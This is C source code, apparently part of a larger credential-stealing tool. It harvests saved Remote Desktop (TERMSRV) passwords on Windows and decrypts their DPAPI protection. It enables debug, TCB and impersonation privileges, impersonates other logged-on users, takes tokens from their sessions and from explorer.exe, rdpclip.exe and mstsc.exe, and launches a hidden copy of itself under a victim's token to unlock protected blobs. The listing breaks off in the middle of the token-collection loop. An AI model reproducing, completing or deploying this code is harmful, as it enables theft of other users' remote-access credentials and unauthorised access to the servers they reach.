#include "rdp.h"
#include "browser/crypto.h"
#include "browser/utils.h"
#include <windows.h>
#include <winreg.h>
#include <wincred.h>
#include <wincrypt.h>
#include <sddl.h>
#include <wtsapi32.h>
#include <tlhelp32.h>
#include <userenv.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
static int rdp_buf_append(char* buf, int rp, size_t cap, const char* fmt, ...) {
    va_list ap;
    size_t avail;
    int n;
    if (!buf || !fmt || cap == 0) return 0;
    if (rp < 0) rp = 0;
    if ((size_t)rp >= cap - 1) { buf[cap - 1] = '\0'; return 0; }
    avail = cap - (size_t)rp;
    va_start(ap, fmt);
    n = vsnprintf(buf + rp, avail, fmt, ap);
    va_end(ap);
    if (n < 0) { buf[rp] = '\0'; return 0; }
    if ((size_t)n >= avail) n = (int)(avail - 1);
    return n;
}


typedef struct {
    char sid[192];
    char profile_path[MAX_PATH];
    char user_name[128];
} RdpProfile;

typedef struct {
    char target[512];
    char server[256];
    char username[256];
    char password[1024];
    DWORD type;
    bool password_readable;
    char source[32]; /* credman / file / vault / probe */
} RdpCredential;

typedef struct {
    int files_seen;
    int files_with_dpapi_sig;
    int files_decrypt_ok;
    int files_parsed;
    int files_termsrv;
    int files_with_password;
    int vault_items;
    int vault_termsrv;
    int vault_with_password;
    int impersonated_sessions;
    int last_crypt_error;
    int dpapi_selftest_ok; /* 1=CryptProtect/Unprotect works in current context */
    int sample_file_size;
    int sample_blob_off;
    int sample_blob_len;
    int sample_dpapi_flags;
    int helper_attempts;
    int helper_ok;
    int profile_load_ok;
    int elev_type; /* TokenElevationType */
    char failed_mk_guids[8][64]; /* masterkey GUIDs of files we could not decrypt in-context */
    int failed_mk_count;
    char sample_path[MAX_PATH];
    char sample_mk_guid[64];
    char last_impersonated_sid[128];
    char decrypt_path_hint[64]; /* inproc / linked / helper */
} RdpRecoverStats;

static RdpRecoverStats g_rdp_stats;

static bool get_token_user_sid(HANDLE token, char* sid_out, int sid_sz);
static uint8_t* read_file_shared(const char* path, int* out_len);


typedef struct {
    char label[64];
    char source[32];
    char file_path[MAX_PATH];
    char group_name[256];
    char server[256];
    char gateway[256];
    char server_domain[256];
    char server_username[256];
    char server_password[1024];
    bool server_password_decrypted;
    char gateway_domain[256];
    char gateway_username[256];
    char gateway_password[1024];
    bool gateway_password_decrypted;
} RdpFileEntry;

static bool should_skip_profile(const char* sid, const char* profile_path, const char* user_name) {
    if (!sid || !profile_path || !user_name) return true;
    if (strcmp(sid, "S-1-5-18") == 0 || strcmp(sid, "S-1-5-19") == 0 || strcmp(sid, "S-1-5-20") == 0) return true;
    if (strstr(profile_path, "\\ServiceProfiles\\") != NULL) return true;
    if (_stricmp(user_name, "LocalService") == 0 || _stricmp(user_name, "NetworkService") == 0 ||
        _stricmp(user_name, "systemprofile") == 0) return true;
    return false;
}

static bool enable_privilege(const char* name) {
    HANDLE token = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) {
        CloseHandle(token);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(token);
    return GetLastError() == ERROR_SUCCESS;
}

static void basename_from_path(const char* path, char* out, int out_sz) {
    const char* p;
    if (!path || !out || out_sz <= 0) return;
    p = strrchr(path, '\\');
    p = p ? p + 1 : path;
    strncpy(out, p, out_sz - 1);
    out[out_sz - 1] = 0;
}

static void trim_inplace(char* s) {
    int len;
    if (!s) return;
    while (*s && (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')) {
        memmove(s, s + 1, strlen(s));
    }
    len = (int)strlen(s);
    while (len > 0 && (s[len - 1] == ' ' || s[len - 1] == '\t' || s[len - 1] == '\r' || s[len - 1] == '\n')) {
        s[--len] = 0;
    }
}

static int utf16_to_utf8_len(const WCHAR* wstr, int wlen, char* out, int out_sz) {
    int n;
    if (!wstr || !out || out_sz <= 0) return 0;
    n = WideCharToMultiByte(CP_UTF8, 0, wstr, wlen, out, out_sz - 1, NULL, NULL);
    if (n < 0) n = 0;
    out[n] = 0;
    return n;
}

static void copy_wstr_utf8(const WCHAR* wstr, char* out, int out_sz) {
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!wstr) return;
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, out, out_sz - 1, NULL, NULL);
    out[out_sz - 1] = 0;
}

static void normalize_termsrv_server(const char* target, char* out, int out_sz) {
    const char* p;
    const char* end;
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!target || !*target) return;
    p = strstr(target, "TERMSRV/");
    if (!p) p = strstr(target, "termsrv/");
    p = p ? p + 8 : target;
    while (*p == '/' || *p == '\\') p++;
    end = p;
    while (*end && *end != '/' && *end != '\\') end++;
    if (end <= p) return;
    {
        int len = (int)(end - p);
        if (len >= out_sz) len = out_sz - 1;
        memcpy(out, p, len);
        out[len] = 0;
    }
    trim_inplace(out);
}

static void trim_server_inplace(char* s) {
    char* p;
    if (!s || !*s) return;
    trim_inplace(s);
    p = strchr(s, ':');
    if (p && strchr(p + 1, ':') == NULL) *p = 0;
    p = strchr(s, '\\');
    if (p) *p = 0;
    p = strchr(s, '/');
    if (p) *p = 0;
    trim_inplace(s);
}

static void trim_target_prefixes(char* s) {
    static const char* prefixes[] = {
        "LegacyGeneric:target=",
        "Domain:target=",
        "target=",
        NULL
    };
    int i;
    if (!s || !*s) return;
    trim_inplace(s);
    for (i = 0; prefixes[i]; i++) {
        size_t len = strlen(prefixes[i]);
        if (_strnicmp(s, prefixes[i], len) == 0) {
            memmove(s, s + len, strlen(s + len) + 1);
            trim_inplace(s);
            return;
        }
    }
}

static void normalize_server_value(const char* raw, char* out, int out_sz) {
    char temp[512];
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!raw || !*raw) return;
    strncpy(temp, raw, sizeof(temp) - 1);
    temp[sizeof(temp) - 1] = 0;
    trim_target_prefixes(temp);
    normalize_termsrv_server(temp, out, out_sz);
    if (!out[0]) {
        strncpy(out, raw, out_sz - 1);
        out[out_sz - 1] = 0;
    }
    trim_target_prefixes(out);
    trim_server_inplace(out);
}

static void extract_user_leaf(const char* raw, char* out, int out_sz) {
    const char* p;
    if (!out || out_sz <= 0) return;
    out[0] = 0;
    if (!raw || !*raw) return;
    while (*raw == ' ' || *raw == '\t') raw++;
    p = strrchr(raw, '\\');
    if (!p) p = strrchr(raw, '/');
    p = p ? p + 1 : raw;
    strncpy(out, p, out_sz - 1);
    out[out_sz - 1] = 0;
    trim_inplace(out);
}

static bool usernames_equivalent(const char* a, const char* b) {
    char ua[256];
    char ub[256];
    if (!a || !b || !*a || !*b) return false;
    extract_user_leaf(a, ua, sizeof(ua));
    extract_user_leaf(b, ub, sizeof(ub));
    return ua[0] && ub[0] && _stricmp(ua, ub) == 0;
}

static bool servers_equivalent(const char* a, const char* b) {
    char sa[256];
    char sb[256];
    const char* da;
    const char* db;
    if (!a || !b || !*a || !*b) return false;
    normalize_server_value(a, sa, sizeof(sa));
    normalize_server_value(b, sb, sizeof(sb));
    if (!sa[0] || !sb[0]) return false;
    if (_stricmp(sa, sb) == 0) return true;
    da = strchr(sa, '.');
    db = strchr(sb, '.');
    if (da && db) {
        size_t la = (size_t)(da - sa);
        size_t lb = (size_t)(db - sb);
        if (la == lb && _strnicmp(sa, sb, la) == 0) return true;
    }
    return false;
}

static void rdp_set_source(RdpCredential* c, const char* src) {
    if (!c) return;
    if (!src) src = "";
    strncpy(c->source, src, sizeof(c->source) - 1);
    c->source[sizeof(c->source) - 1] = 0;
}

static bool credential_blob_to_password(const BYTE* blob, DWORD blob_size, char* out, int out_sz) {
    int i;
    if (!out || out_sz <= 0) return false;
    out[0] = 0;
    if (!blob || blob_size == 0) return false;

    if (blob_size > 24 && blob[0] == 0x01 && blob[1] == 0x00 && blob[2] == 0x00 && blob[3] == 0x00 &&
        blob_size >= 20 && blob[4] == 0xD0 && blob[5] == 0x8C) {
        DATA_BLOB in_blob;
        DATA_BLOB out_blob;
        in_blob.cbData = blob_size;
        in_blob.pbData = (BYTE*)blob;
        out_blob.cbData = 0;
        out_blob.pbData = NULL;
        if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob) && out_blob.pbData && out_blob.cbData > 0) {
            bool ok = false;
            if (out_blob.cbData >= sizeof(WCHAR) && (out_blob.cbData % sizeof(WCHAR)) == 0) {
                int wchar_len = (int)(out_blob.cbData / sizeof(WCHAR));
                const WCHAR* w = (const WCHAR*)out_blob.pbData;
                while (wchar_len > 0 && w[wchar_len - 1] == 0) wchar_len--;
                utf16_to_utf8_len(w, wchar_len, out, out_sz);
                trim_inplace(out);
                ok = out[0] != 0;
            }
            if (!ok) {
                int n = (int)out_blob.cbData;
                if (n >= out_sz) n = out_sz - 1;
                memcpy(out, out_blob.pbData, (size_t)n);
                out[n] = 0;
                trim_inplace(out);
                ok = out[0] != 0;
            }
            LocalFree(out_blob.pbData);
            if (ok) return true;
        } else {
            g_rdp_stats.last_crypt_error = (int)GetLastError();
        }
    }

    if (blob_size >= sizeof(WCHAR) && (blob_size % sizeof(WCHAR)) == 0) {
        int wchar_len = (int)(blob_size / sizeof(WCHAR));
        const WCHAR* w = (const WCHAR*)blob;
        int printable = 0, checked = 0;
        while (wchar_len > 0 && w[wchar_len - 1] == 0) wchar_len--;
        for (i = 0; i < wchar_len && i < 64; i++) {
            checked++;
            if (w[i] >= 32 && w[i] < 127) printable++;
            else if (w[i] > 127) printable++;
            else if (w[i] == 9 || w[i] == 10 || w[i] == 13) printable++;
        }
        if (wchar_len > 0 && (checked == 0 || printable * 2 >= checked)) {
            utf16_to_utf8_len(w, wchar_len, out, out_sz);
            trim_inplace(out);
            if (out[0]) return true;
        }
    }

    {
        int n = (int)blob_size;
        if (n >= out_sz) n = out_sz - 1;
        for (i = 0; i < n; i++) {
            if (blob[i] == 0) { n = i; break; }
            out[i] = (char)blob[i];
        }
        out[n] = 0;
        trim_inplace(out);
        if (out[0]) return true;
    }
    return false;
}

static bool target_looks_like_termsrv(const char* target) {
    char normalized[512];
    if (!target || !*target) return false;
    if (strstr(target, "TERMSRV/") != NULL || strstr(target, "termsrv/") != NULL) return true;
    if (strstr(target, "TERMSRV\\") != NULL || strstr(target, "termsrv\\") != NULL) return true;
    strncpy(normalized, target, sizeof(normalized) - 1);
    normalized[sizeof(normalized) - 1] = 0;
    trim_target_prefixes(normalized);
    return strstr(normalized, "TERMSRV/") != NULL || strstr(normalized, "termsrv/") != NULL ||
           strstr(normalized, "TERMSRV\\") != NULL || strstr(normalized, "termsrv\\") != NULL;
}

static bool read_len_prefixed_utf16(const uint8_t* data, int data_len, int* offset, char* out, int out_sz) {
    DWORD nbytes;
    if (!data || !offset || *offset < 0) return false;
    if (*offset + 4 > data_len) return false;
    memcpy(&nbytes, data + *offset, 4);
    *offset += 4;
    if (nbytes > 0x20000u) return false;
    if (*offset + (int)nbytes > data_len) return false;
    if (out && out_sz > 0) {
        out[0] = 0;
        if (nbytes >= sizeof(WCHAR)) {
            int wchar_len = (int)(nbytes / sizeof(WCHAR));
            const WCHAR* w = (const WCHAR*)(data + *offset);
            while (wchar_len > 0 && w[wchar_len - 1] == 0) wchar_len--;
            utf16_to_utf8_len(w, wchar_len, out, out_sz);
            trim_inplace(out);
        }
    }
    *offset += (int)nbytes;
    return true;
}

static bool read_len_prefixed_blob(const uint8_t* data, int data_len, int* offset,
                                   const uint8_t** blob, int* blob_len) {
    DWORD nbytes;
    if (!data || !offset || !blob || !blob_len) return false;
    if (*offset + 4 > data_len) return false;
    memcpy(&nbytes, data + *offset, 4);
    *offset += 4;
    if (nbytes > 0x20000u) return false;
    if (*offset + (int)nbytes > data_len) return false;
    *blob = data + *offset;
    *blob_len = (int)nbytes;
    *offset += (int)nbytes;
    return true;
}

static int find_dpapi_blob_offset(const uint8_t* data, int len) {
    static const uint8_t sig[] = {
        0x01, 0x00, 0x00, 0x00,
        0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11,
        0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
    };
    int i;
    if (!data || len < (int)sizeof(sig)) return -1;
    for (i = 0; i <= len - (int)sizeof(sig); i++) {
        if (memcmp(data + i, sig, sizeof(sig)) == 0) return i;
    }
    return -1;
}

/* Walk classic DPAPI blob and return exact total size, or -1. */
static int dpapi_blob_total_size(const uint8_t* data, int len) {
    int off;
    DWORD desc_len, salt_len, hmac_key_len, hmac2_key_len, data_len, sign_len;
    static const uint8_t prov[] = {
        0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11,
        0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
    };
    if (!data || len < 48) return -1;
    if (!(data[0] == 0x01 && data[1] == 0x00 && data[2] == 0x00 && data[3] == 0x00)) return -1;
    if (memcmp(data + 4, prov, 16) != 0) return -1;
    off = 44; /* up to flags end; next is descLen */
    if (off + 4 > len) return -1;
    memcpy(&desc_len, data + off, 4); off += 4;
    if (desc_len > 0x10000u || off + (int)desc_len + 8 > len) return -1;
    off += (int)desc_len;
    if (off + 8 > len) return -1; /* algCrypt + dwAlgCryptLen */
    off += 8;
    if (off + 4 > len) return -1;
    memcpy(&salt_len, data + off, 4); off += 4;
    if (salt_len > 0x10000u || off + (int)salt_len + 4 > len) return -1;
    off += (int)salt_len;
    if (off + 4 > len) return -1;
    memcpy(&hmac_key_len, data + off, 4); off += 4;
    if (hmac_key_len > 0x10000u || off + (int)hmac_key_len + 8 > len) return -1;
    off += (int)hmac_key_len;
    if (off + 8 > len) return -1; /* algHash + dwAlgHashLen */
    off += 8;
    if (off + 4 > len) return -1;
    memcpy(&hmac2_key_len, data + off, 4); off += 4;
    if (hmac2_key_len > 0x10000u || off + (int)hmac2_key_len + 4 > len) return -1;
    off += (int)hmac2_key_len;
    if (off + 4 > len) return -1;
    memcpy(&data_len, data + off, 4); off += 4;
    if (data_len > 0x400000u || off + (int)data_len + 4 > len) return -1;
    off += (int)data_len;
    if (off + 4 > len) return -1;
    memcpy(&sign_len, data + off, 4); off += 4;
    if (sign_len > 0x10000u || off + (int)sign_len > len) return -1;
    off += (int)sign_len;
    return off;
}

static uint8_t* crypt_unprotect_try(const uint8_t* data, int len, int* out_len) {
    DATA_BLOB in_blob;
    DATA_BLOB out_blob;
    uint8_t* out;
    DWORD flags_try[3];
    int fi;
    if (!data || len <= 0 || !out_len) return NULL;
    *out_len = 0;
    flags_try[0] = 0;
    flags_try[1] = CRYPTPROTECT_UI_FORBIDDEN;
#ifdef CRYPTPROTECT_LOCAL_MACHINE
    flags_try[2] = CRYPTPROTECT_LOCAL_MACHINE;
#else
    flags_try[2] = 0x4;
#endif
    in_blob.cbData = (DWORD)len;
    in_blob.pbData = (BYTE*)data;
    for (fi = 0; fi < 3; fi++) {
        out_blob.cbData = 0;
        out_blob.pbData = NULL;
        if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, flags_try[fi], &out_blob) &&
            out_blob.pbData && out_blob.cbData > 0) {
            out = (uint8_t*)malloc(out_blob.cbData ? out_blob.cbData : 1);
            if (!out) {
                LocalFree(out_blob.pbData);
                return NULL;
            }
            memcpy(out, out_blob.pbData, out_blob.cbData);
            *out_len = (int)out_blob.cbData;
            LocalFree(out_blob.pbData);
            return out;
        }
        g_rdp_stats.last_crypt_error = (int)GetLastError();
        if (out_blob.pbData) LocalFree(out_blob.pbData);
    }
    return NULL;
}

static uint8_t* crypt_unprotect_alloc(const uint8_t* data, int len, int* out_len) {
    int lengths[8];
    int n = 0, i, exact;
    if (!data || len <= 0 || !out_len) return NULL;
    *out_len = 0;

    exact = dpapi_blob_total_size(data, len);
    if (exact > 0 && exact <= len) lengths[n++] = exact;
    lengths[n++] = len;
    /* Prefer shorter prefixes of a valid-looking blob (strip trailing pad). */
    if (exact < 0 && len > 64) {
        int try_lens[] = { len - 1, len - 2, len - 4, len - 8, len - 16 };
        int t;
        for (t = 0; t < 5; t++) {
            int L = try_lens[t];
            if (L > 40 && dpapi_blob_total_size(data, L) == L) lengths[n++] = L;
        }
    }

    for (i = 0; i < n; i++) {
        int L = lengths[i];
        int j, dup = 0;
        uint8_t* out;
        if (L <= 0 || L > len) continue;
        for (j = 0; j < i; j++) if (lengths[j] == L) { dup = 1; break; }
        if (dup) continue;
        out = crypt_unprotect_try(data, L, out_len);
        if (out) return out;
    }
    return NULL;
}

/* ---- DPAPI context helpers: elevation / profile / user-session process ---- */

static void rdp_guid_to_str(const uint8_t* g, char* out, int out_sz) {
    /* GUID is stored little-endian like Windows GUID */
    if (!out || out_sz < 37 || !g) return;
    snprintf(out, out_sz,
             "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
             g[3], g[2], g[1], g[0], g[5], g[4], g[7], g[6],
             g[8], g[9], g[10], g[11], g[12], g[13], g[14], g[15]);
}

static void rdp_note_dpapi_header(const uint8_t* blob, int len) {
    if (!blob || len < 44) return;
    if (!(blob[0] == 0x01 && blob[1] == 0x00 && blob[2] == 0x00 && blob[3] == 0x00)) return;
    if (!g_rdp_stats.sample_mk_guid[0] && len >= 40)
        rdp_guid_to_str(blob + 24, g_rdp_stats.sample_mk_guid, sizeof(g_rdp_stats.sample_mk_guid));
    if (g_rdp_stats.sample_dpapi_flags == 0 && len >= 44) {
        DWORD flags = 0;
        memcpy(&flags, blob + 40, 4);
        g_rdp_stats.sample_dpapi_flags = (int)flags;
    }
}

static bool rdp_get_token_username(HANDLE token, char* out, int out_sz) {
    DWORD need = 0;
    BYTE* buf;
    if (!token || !out || out_sz <= 0) return false;
    out[0] = 0;
    GetTokenInformation(token, TokenUser, NULL, 0, &need);
    if (!need) return false;
    buf = (BYTE*)malloc(need);
    if (!buf) return false;
    if (GetTokenInformation(token, TokenUser, buf, need, &need)) {
        TOKEN_USER* tu = (TOKEN_USER*)buf;
        char name[128] = {0}, domain[128] = {0};
        DWORD nlen = (DWORD)sizeof(name), dlen = (DWORD)sizeof(domain);
        SID_NAME_USE use;
        if (LookupAccountSidA(NULL, tu->User.Sid, name, &nlen, domain, &dlen, &use) && name[0]) {
            strncpy(out, name, out_sz - 1);
            out[out_sz - 1] = 0;
            free(buf);
            return true;
        }
    }
    free(buf);
    return false;
}

static HANDLE rdp_duplicate_primary(HANDLE token) {
    HANDLE primary = NULL;
    if (!token) return NULL;
    if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &primary) || !primary)
        return NULL;
    return primary;
}

static HANDLE rdp_get_linked_token(HANDLE token) {
    TOKEN_LINKED_TOKEN lt;
    DWORD need = sizeof(lt);
    memset(&lt, 0, sizeof(lt));
    if (!token) return NULL;
    if (!GetTokenInformation(token, TokenLinkedToken, &lt, sizeof(lt), &need)) return NULL;
    return lt.LinkedToken; /* caller owns */
}

static void rdp_note_elev_type(HANDLE token) {
    DWORD elev = 0, need = sizeof(elev);
    if (!token) return;
    if (GetTokenInformation(token, TokenElevationType, &elev, sizeof(elev), &need))
        g_rdp_stats.elev_type = (int)elev;
}

/* Impersonate: prefer medium/linked when elevated; also try original. Load profile. */
static bool rdp_impersonate_token_ex(HANDLE token, bool* loaded_profile, PROFILEINFOA* pinfo) {
    HANDLE try_tokens[3];
    int n = 0, i;
    char uname[128];
    if (loaded_profile) *loaded_profile = false;
    if (!token) return false;
    memset(try_tokens, 0, sizeof(try_tokens));
    rdp_note_elev_type(token);

    {
        DWORD elevType = 0, need = sizeof(elevType);
        if (GetTokenInformation(token, TokenElevationType, &elevType, sizeof(elevType), &need) &&
            elevType == TokenElevationTypeFull) {
            HANDLE linked = rdp_get_linked_token(token);
            if (linked) try_tokens[n++] = linked; /* prefer medium IL for DPAPI */
        }
    }
    try_tokens[n++] = token;

    for (i = 0; i < n; i++) {
        HANDLE t = try_tokens[i];
        if (!t) continue;
        if (!ImpersonateLoggedOnUser(t)) continue;

        get_token_user_sid(t, g_rdp_stats.last_impersonated_sid, sizeof(g_rdp_stats.last_impersonated_sid));

        if (pinfo) {
            memset(pinfo, 0, sizeof(*pinfo));
            pinfo->dwSize = sizeof(*pinfo);
            pinfo->dwFlags = PI_NOUI;
            uname[0] = 0;
            if (rdp_get_token_username(t, uname, sizeof(uname))) {
                pinfo->lpUserName = uname;
                /* LoadUserProfile needs a primary token typically; try anyway. */
                if (LoadUserProfileA(t, pinfo) || LoadUserProfileA(token, pinfo)) {
                    if (loaded_profile) *loaded_profile = true;
                    g_rdp_stats.profile_load_ok++;
                } else {
                    pinfo->hProfile = NULL;
                }
            }
        }
        /* Close extra linked handle later by caller pattern: close if not original */
        if (i == 0 && try_tokens[0] != token && n > 1) {
            /* keep linked open only while impersonating - close after revert in caller via pinfo path */
        }
        /* Close linked token handle if we opened it and it's not the one we must keep */
        {
            int j;
            for (j = 0; j < n; j++) {
                if (try_tokens[j] && try_tokens[j] != token && try_tokens[j] != t)
                    CloseHandle(try_tokens[j]);
            }
            /* if t is linked, stash in pinfo->lpDefaultPath unused? just leave open until revert - close now safe after Impersonate copies ref? Close after success */
            if (t != token) {
                /* ImpersonateLoggedOnUser refs the token; safe to close */
                CloseHandle(t);
            }
        }
        return true;
    }
    /* cleanup linked on failure */
    {
        int j;
        for (j = 0; j < n; j++)
            if (try_tokens[j] && try_tokens[j] != token) CloseHandle(try_tokens[j]);
    }
    return false;
}

static void rdp_revert_and_unload(bool loaded_profile, PROFILEINFOA* pinfo, HANDLE token_for_unload) {
    if (loaded_profile && pinfo && pinfo->hProfile && token_for_unload)
        UnloadUserProfile(token_for_unload, pinfo->hProfile);
    RevertToSelf();
}

static bool rdp_write_temp_bin(const uint8_t* data, int len, char* path_out, int path_sz) {
    char dir[MAX_PATH];
    char name[MAX_PATH];
    HANDLE h;
    DWORD written = 0;
    if (!data || len <= 0 || !path_out || path_sz <= 0) return false;
    path_out[0] = 0;
    if (!GetTempPathA(sizeof(dir), dir)) return false;
    if (!GetTempFileNameA(dir, "rdp", 0, name)) return false;
    h = CreateFileA(name, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    if (!WriteFile(h, data, (DWORD)len, &written, NULL) || (int)written != len) {
        CloseHandle(h);
        DeleteFileA(name);
        return false;
    }
    CloseHandle(h);
    strncpy(path_out, name, path_sz - 1);
    path_out[path_sz - 1] = 0;
    return true;
}

static uint8_t* rdp_read_all_file(const char* path, int* out_len) {
    return read_file_shared(path, out_len);
}

/* Run CryptUnprotectData inside a process started with the user's primary token.
 * This is the most reliable way to access interactive-logon DPAPI master keys
 * when the parent is elevated or only has an incomplete impersonation context.
 */
static uint8_t* crypt_unprotect_via_user_process(HANDLE primary_token, const uint8_t* data, int len, int* out_len) {
    char exe[MAX_PATH];
    char in_path[MAX_PATH], out_path[MAX_PATH], cmd[MAX_PATH * 4];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = 1, wait;
    uint8_t* result = NULL;
    LPVOID env = NULL;
    BOOL ok_proc = FALSE;

    if (!primary_token || !data || len <= 0 || !out_len) return NULL;
    *out_len = 0;
    g_rdp_stats.helper_attempts++;

    if (!GetModuleFileNameA(NULL, exe, MAX_PATH) || !exe[0]) return NULL;
    if (!rdp_write_temp_bin(data, len, in_path, sizeof(in_path))) return NULL;
    {
        char dir[MAX_PATH];
        if (!GetTempPathA(sizeof(dir), dir) || !GetTempFileNameA(dir, "rdo", 0, out_path)) {
            DeleteFileA(in_path);
            return NULL;
        }
        DeleteFileA(out_path); /* GetTempFileName creates it; child will create fresh */
    }

    snprintf(cmd, sizeof(cmd), "\"%s\" --rdp-dpapi-unprotect \"%s\" \"%s\"", exe, in_path, out_path);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    enable_privilege(SE_IMPERSONATE_NAME);
    enable_privilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    enable_privilege(SE_INCREASE_QUOTA_NAME);

    /* Prefer CreateProcessWithTokenW (works with SeImpersonate + primary token). */
    {
        typedef BOOL (WINAPI *CPWTW_t)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
        CPWTW_t pW = (CPWTW_t)GetProcAddress(GetModuleHandleA("advapi32.dll"), "CreateProcessWithTokenW");
        if (pW) {
            WCHAR wexe[MAX_PATH], wcmd[MAX_PATH * 4];
            STARTUPINFOW siw;
            MultiByteToWideChar(CP_ACP, 0, exe, -1, wexe, MAX_PATH);
            MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, (int)(sizeof(wcmd) / sizeof(wcmd[0])));
            memset(&siw, 0, sizeof(siw));
            siw.cb = sizeof(siw);
            siw.dwFlags = STARTF_USESHOWWINDOW;
            siw.wShowWindow = SW_HIDE;
            if (CreateEnvironmentBlock(&env, primary_token, FALSE)) {
                ok_proc = pW(primary_token, 0, wexe, wcmd,
                             CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
                             env, NULL, &siw, &pi);
            }
            if (!ok_proc) {
                ok_proc = pW(primary_token, 0, wexe, wcmd, CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);
            }
        }
    }
    if (!ok_proc) {
        /* Fallback: CreateProcessAsUserA (often needs SYSTEM / assign-primary). */
        ok_proc = CreateProcessAsUserA(primary_token, exe, cmd, NULL, NULL, FALSE,
                                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
    if (env) DestroyEnvironmentBlock(env);

    if (!ok_proc) {
        g_rdp_stats.last_crypt_error = (int)GetLastError();
        DeleteFileA(in_path);
        DeleteFileA(out_path);
        return NULL;
    }

    wait = WaitForSingleObject(pi.hProcess, 15000);
    if (wait == WAIT_OBJECT_0) {
        GetExitCodeProcess(pi.hProcess, &exit_code);
        if (exit_code == 0) {
            int rlen = 0;
            uint8_t* raw = rdp_read_all_file(out_path, &rlen);
            if (!raw) raw = read_file(out_path, &rlen);
            if (raw && rlen > 0) {
                result = raw;
                *out_len = rlen;
                g_rdp_stats.helper_ok++;
                if (!g_rdp_stats.decrypt_path_hint[0])
                    strncpy(g_rdp_stats.decrypt_path_hint, "helper", sizeof(g_rdp_stats.decrypt_path_hint) - 1);
            } else {
                free(raw);
            }
        } else {
            g_rdp_stats.last_crypt_error = (int)exit_code;
        }
    } else {
        TerminateProcess(pi.hProcess, 1);
        g_rdp_stats.last_crypt_error = (int)GetLastError();
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileA(in_path);
    DeleteFileA(out_path);
    return result;
}

/* Gather primary tokens useful for DPAPI (linked medium, explorer, WTS). */
static int rdp_collect_primary_tokens(HANDLE* out, int max) {
    int n = 0;
    HANDLE proc_tok = NULL;
    HANDLE snap;
    WTS_SESSION_INFOA* sessions = NULL;
    DWORD scount = 0, i;

    if (!out || max <= 0) return 0;

    enable_privilege(SE_TCB_NAME);
    enable_privilege(SE_DEBUG_NAME);
    enable_privilege(SE_IMPERSONATE_NAME);
    enable_privilege(SE_ASSIGNPRIMARYTOKEN_NAME);
    enable_privilege(SE_INCREASE_QUOTA_NAME);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ASSIGN_PRIMARY, &proc_tok) && proc_tok) {
        HANDLE linked = rdp_get_linked_token(proc_tok);
        HANDLE primary;
        rdp_note_elev_type(proc_tok);
        if (linked) {
            primary = rdp_duplicate_primary(linked);
            CloseHandle(linked);
            if (primary && n < max) out[n++] = primary;
        }
        primary = rdp_duplicate_primary(proc_tok);
        if (primary && n < max) out[n++] = primary;
        CloseHandle(proc_tok);
    }

    if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &scount) && sessions) {
        for (i = 0; i < scount && n < max; i++) {
            HANDLE user_token = NULL;
            HANDLE primary;
            if (sessions[i].State != WTSActive && sessions[i].State != WTSDisconnected &&
                sessions[i].State != WTSConnected)
                continue;
            if (!WTSQueryUserToken(sessions[i].SessionId, &user_token) || !user_token) continue;
            primary = rdp_duplicate_primary(user_token);
            if (primary && n < max) out[n++] = primary;
            CloseHandle(user_token);
        }
        WTSFreeMemory(sessions);
    }

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                HANDLE proc, ptok, primary;
                if (_stricmp(pe.szExeFile, "explorer.exe") != 0 &&
                    _stricmp(pe.szExeFile, "rdpclip.exe") != 0 &&
                    _stricmp(pe.szExeFile, "mstsc.exe") != 0)
                    continue;
                proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!proc) proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                if (!proc) continue;
                ptok = NULL;
                if (OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &ptok) && ptok) {
